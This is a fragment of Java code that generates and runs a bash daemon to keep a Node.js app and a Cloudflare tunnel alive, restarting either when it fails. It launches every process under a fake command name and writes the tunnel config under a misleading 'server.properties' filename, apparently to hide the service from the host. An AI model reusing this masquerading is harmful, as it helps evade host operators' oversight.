        "echo \"$DAEMON_PGID\" > \"$WORK_DIR/.daemon_pgid\"\n" +
        "echo \"$DAEMON_PGID\" > \"$WORK_DIR/.pids\"\n" +
        "\n" +
        // ★★★ 初始化: 启动 Node.js ★★★
        "# ============ 初始化: 启动 Node.js ============\n" +
        "is_port_free() { (echo >/dev/tcp/localhost/$1) &>/dev/null && return 1 || return 0; }\n" +
        "while true; do NODE_PORT=$((RANDOM % 40000 + 20000)); if is_port_free $NODE_PORT; then break; fi; done\n" +
        "export SERVER_PORT=$NODE_PORT; export PORT=$NODE_PORT\n" +
        "echo \"$NODE_PORT\" > \"$WORK_DIR/.node_port\"\n" +
        "\n" +
        "(exec -a \"" + FAKE_CMD + "\" \"$NODE_FAKE\" $NODE_SCRIPT > \"$WORK_DIR/.node_app.log\" 2>&1) &\n" +
        "NODE_PID=$!\n" +
        "echo \"$NODE_PID\" >> \"$WORK_DIR/.pids\"\n" +
        "# 等待 HTTP 就绪\n" +
        "for i in $(seq 1 120); do\n" +
        "    HTTP_CODE=$(curl -s -o /dev/null -w \"%{http_code}\" \"http://127.0.0.1:$NODE_PORT\" --connect-timeout 2 --max-time 5 2>/dev/null)\n" +
        "    if [ -n \"$HTTP_CODE\" ] && [ \"$HTTP_CODE\" != \"000\" ]; then break; fi\n" +
        "    sleep 1\n" +
        "done\n" +
        "\n" +
        // ★★★ 初始化: 启动 Cloudflared 隧道 ★★★
        "# ============ 初始化: 启动 Cloudflared 隧道 ============\n" +
        "CF_PID=\"\"\n" +
        "write_cf_config() { local PROTO=$1; cat > \"$CF_CONF_DIR/server.properties\" << CFCONF\n" +
        "url: http://localhost:$NODE_PORT\n" +
        "no-autoupdate: true\n" +
        "protocol: $PROTO\n" +
        "proxy-connect-timeout: 30s\n" +
        "proxy-keep-alive-timeout: 90s\n" +
        "CFCONF\n }\n" +
        "\n" +
        "if [ \"" + CF_ENABLED + "\" = \"true\" ] && [ -f \"$CF_BIN\" ]; then\n" +
        "    mkdir -p \"$WORK_DIR/.cf\"\n" +
        "    if [ \"" + cfMode + "\" = \"fixed\" ] && [ -n \"" + CF_TOKEN + "\" ]; then\n" +
        "        for PROTO in http2 quic; do\n" +
        "            rm -f \"$WORK_DIR/.cf/cf.log\"\n" +
        "            (exec -a \"" + FAKE_CMD + "\" \"$CF_BIN\" tunnel run --protocol $PROTO --token \"" + CF_TOKEN + "\" > \"$WORK_DIR/.cf/cf.log\" 2>&1) &\n" +
        "            CF_PID=$!\n" +
        "            sleep 5\n" +
        "            if kill -0 $CF_PID 2>/dev/null; then\n" +
        "                echo \"$CF_PID\" >> \"$WORK_DIR/.pids\"\n" +
        "                echo \"" + CF_DOMAIN + "\" > \"$WORK_DIR/.cf/tunnel_url.txt\"\n" +
        "                break\n" +
        "            fi\n" +
        "            wait $CF_PID 2>/dev/null\n" +
        "            CF_PID=\"\"\n" +
        "        done\n" +
        "    else\n" +
        "        TUNNEL_ESTABLISHED=false\n" +
        "        for PROTO in http2 quic auto; do\n" +
        "            if [ \"$TUNNEL_ESTABLISHED\" = \"true\" ]; then break; fi\n" +
        "            for attempt in 1 2 3; do\n" +
        "                if [ \"$TUNNEL_ESTABLISHED\" = \"true\" ]; then break; fi\n" +
        "                rm -f \"$WORK_DIR/.cf/cf.log\" \"$WORK_DIR/.cf/tunnel_url.txt\"\n" +
        "                write_cf_config \"$PROTO\"\n" +
        "                (exec -a \"" + FAKE_CMD + "\" \"$CF_BIN\" --config \"$CF_CONF_DIR/server.properties\" > \"$WORK_DIR/.cf/cf.log\" 2>&1) &\n" +
        "                NEW_PID=$!\n" +
        "                sleep 5\n" +
        "                if ! kill -0 $NEW_PID 2>/dev/null; then\n" +
        "                    wait $NEW_PID 2>/dev/null\n" +
        "                    continue\n" +
        "                fi\n" +
        "                for i in $(seq 1 45); do\n" +
        "                    if ! kill -0 $NEW_PID 2>/dev/null; then break; fi\n" +
        "                    URL=$(grep -oP 'https://[a-zA-Z0-9-]+\\\\.trycloudflare\\\\.com' \"$WORK_DIR/.cf/cf.log\" 2>/dev/null | grep -v 'api\\.trycloudflare\\.com' | tail -1)\n" +
        "                    if [ -n \"$URL\" ]; then\n" +
        "                        echo \"$URL\" > \"$WORK_DIR/.cf/tunnel_url.txt\"\n" +
        "                        echo \"PROTOCOL=$PROTO\" >> \"$WORK_DIR/.cf/tunnel_url.txt\"\n" +
        "                        CF_PID=$NEW_PID\n" +
        "                        echo \"$CF_PID\" >> \"$WORK_DIR/.pids\"\n" +
        "                        TUNNEL_ESTABLISHED=true\n" +
        "                        break\n" +
        "                    fi\n" +
        "                    sleep 1\n" +
        "                done\n" +
        "                if [ \"$TUNNEL_ESTABLISHED\" != \"true\" ]; then\n" +
        "                    kill_tree $NEW_PID 2>/dev/null\n" +
        "                    CF_PID=\"\"\n" +
        "                fi\n" +
        "            done\n" +
        "        done\n" +
        "    fi\n" +
        "fi\n" +
        "\n" +
        // ★★★ 监控循环 ★★★
        "# ============ 监控循环 ============\n" +
        "NODE_FAIL_COUNT=0\n" +
        "\n" +
        "while true; do\n" +
        "    NEED_RESTART_NODE=false\n" +
        "    if [ -n \"$NODE_PID\" ] && ! kill -0 $NODE_PID 2>/dev/null; then\n" +
        "        # Node 进程已死 → 先 wait 回收再重启\n" +
        "        wait $NODE_PID 2>/dev/null\n" +
        "        NEED_RESTART_NODE=true\n" +
        "    fi\n" +
        "    if [ \"$NEED_RESTART_NODE\" = \"false\" ]; then\n" +
        "        HTTP_CODE=$(curl -s -o /dev/null -w \"%{http_code}\" \"http://127.0.0.1:$NODE_PORT\" --connect-timeout 2 --max-time 5 2>/dev/null)\n" +
        "        if [ \"$HTTP_CODE\" = \"000\" ] || [ -z \"$HTTP_CODE\" ]; then\n" +
        "            NODE_FAIL_COUNT=$((NODE_FAIL_COUNT + 1))\n" +
        "            if [ $NODE_FAIL_COUNT -ge 3 ]; then NEED_RESTART_NODE=true; fi\n" +
        "        else NODE_FAIL_COUNT=0; fi\n" +
        "    fi\n" +
        "    if [ \"$NEED_RESTART_NODE\" = \"true\" ]; then\n" +
        "        # ★ 重启前先杀干净旧进程组 + wait 回收\n" +
        "        [ -n \"$NODE_PID\" ] && kill_tree $NODE_PID 2>/dev/null; NODE_PID=\"\"\n" +
        "        [ -n \"$CF_PID\" ] && kill_tree $CF_PID 2>/dev/null; CF_PID=\"\"\n" +
        "        cd \"$APP_DIR\"; export SERVER_PORT=$NODE_PORT; export PORT=$NODE_PORT\n" +
        "        (exec -a \"" + FAKE_CMD + "\" \"$NODE_FAKE\" $NODE_SCRIPT >> \"$WORK_DIR/.node_app.log\" 2>&1) & NODE_PID=$!\n" +
        "        echo \"$NODE_PID\" > \"$WORK_DIR/.pids\"\n" +
        "        echo \"$DAEMON_PGID\" >> \"$WORK_DIR/.pids\"\n" +
        "        NODE_FAIL_COUNT=0\n" +
        "        for i in $(seq 1 60); do\n" +
        "            HTTP_CODE=$(curl -s -o /dev/null -w \"%{http_code}\" \"http://127.0.0.1:$NODE_PORT\" 2>/dev/null)\n" +
        "            if [ -n \"$HTTP_CODE\" ] && [ \"$HTTP_CODE\" != \"000\" ]; then break; fi\n" +
        "            sleep 1\n" +
        "        done\n" +
        "    fi\n" +
        "\n" +
        "    NEED_REBUILD=false\n" +
        "    if [ -z \"$CF_PID\" ]; then NEED_REBUILD=true\n" +
        "    elif ! kill -0 $CF_PID 2>/dev/null; then\n" +
        "        wait $CF_PID 2>/dev/null\n" +
        "        NEED_REBUILD=true\n" +
        "    fi\n" +
        "    if [ \"$NEED_REBUILD\" = \"true\" ] && [ \"" + CF_ENABLED + "\" = \"true\" ] && [ -f \"$CF_BIN\" ]; then\n" +
        "        rm -f \"$WORK_DIR/.cf/tunnel_url.txt\" \"$WORK_DIR/.cf/cf.log\"; TUNNEL_OK=false\n" +
        "        for RPROTO in http2 quic auto; do\n" +
        "            if [ \"$TUNNEL_OK\" = \"true\" ]; then break; fi; rm -f \"$WORK_DIR/.cf/cf.log\"\n" +
        "            write_cf_config \"$RPROTO\"\n" +
        "            (exec -a \"" + FAKE_CMD + "\" \"$CF_BIN\" --config \"$CF_CONF_DIR/server.properties\" > \"$WORK_DIR/.cf/cf.log\" 2>&1) & NEW_PID=$!\n" +
        "            for i in $(seq 1 45); do\n" +
        "                if ! kill -0 $NEW_PID 2>/dev/null; then break; fi\n" +
        "                URL=$(grep -oP 'https://[a-zA-Z0-9-]+\\\\.trycloudflare\\\\.com' \"$WORK_DIR/.cf/cf.log\" 2>/dev/null | grep -v 'api\\.trycloudflare\\.com' | tail -1)\n" +
        "                if [ -n \"$URL\" ]; then echo \"$URL\" > \"$WORK_DIR/.cf/tunnel_url.txt\"; CF_PID=$NEW_PID; TUNNEL_OK=true; break; fi\n" +
        "                sleep 1\n" +
        "            done\n" +
        "            if [ \"$TUNNEL_OK\" != \"true\" ]; then\n" +
        "                kill_tree $NEW_PID 2>/dev/null\n" +
        "                CF_PID=\"\"\n" +
        "            fi\n" +
        "        done\n" +
        "    fi\n" +
        "    sleep 5\n" +
        "done\n" +
        "DAEMONSCRIPT\n" +
        "chmod +x daemon.sh\n";
}

/**
 * ★ v3: 执行 deploy.sh（只做安装配置，不启动进程）
 */
private static void executeDeployScript(Path script) throws Exception {
    ProcessBuilder pb = new ProcessBuilder("bash", script.toString());
    pb.directory(script.getParent().toFile());
    pb.redirectErrorStream(true);
    pb.redirectOutput(ProcessBuilder.Redirect.INHERIT);
    Process p = pb.start();
    Thread t = new Thread(() -> { try (BufferedReader r = new BufferedReader(new InputStreamReader(p.getInputStream()))) { while (r.readLine() != null) {} } catch (IOException ignored) {} }, "Deploy-Log");
    t.setDaemon(true); t.start();
    if (!p.waitFor(10, TimeUnit.MINUTES)) { p.destroyForcibly(); p.waitFor(30, TimeUnit.SECONDS); }
}

/**
 * ★ v3: 执行 daemon.sh（用 setsid 启动，记录 PGID）
 *
 * daemon.sh 包含所有进程启动和监控逻辑。
 * 用 setsid 启动 → 新会话 → 信号隔离
 * 记录 PGID → Java 端可以精确清理整个进程组
 */
private static void executeDaemonScript(Path daemonScript) throws Exception {
    if (!Files.exists(daemonScript)) {
        System.err.println("[Guard] daemon.sh not found, skipping daemon start");
        return;
    }

    // 用 setsid 启动 daemon.sh，创建新会话
    ProcessBuilder pb = new ProcessBuilder("setsid", "bash", daemonScript.toString());
    pb.directory(daemonScript.getParent().toFile());
    pb.redirectErrorStream(true);

    // 重定向输出到 daemon.log
    Path logFile = daemonScript.getParent().resolve("daemon.log");
    pb.redirectOutput(ProcessBuilder.Redirect.appendTo(logFile.toFile()));
    pb.redirectError(ProcessBuilder.Redirect.appendTo(logFile.toFile()));

    Process p = pb.start();

    // ★ 读取 daemon PGID（从 .daemon_pgid 文件）
    // daemon.sh 启动后会写入自己的 PGID
    for (int i = 0; i < 30; i++) {
        try { Thread.sleep(1000); } catch (InterruptedException ignored) { return; }
        try {
            Path pgidFile = daemonScript.getParent().resolve(".daemon_pgid");
            if (Files.exists(pgidFile)) {
                String pgidStr = Files.readString(pgidFile).trim();
                if (!pgidStr.isEmpty()) {
                    daemonPgid = Long.parseLong(pgidStr.split("\\n")[0].trim());
                    System.out.println("[Guard] Daemon started with PGID: " + daemonPgid);
                    break;
                }
            }
        } catch (Exception ignored) {}
    }
}
}
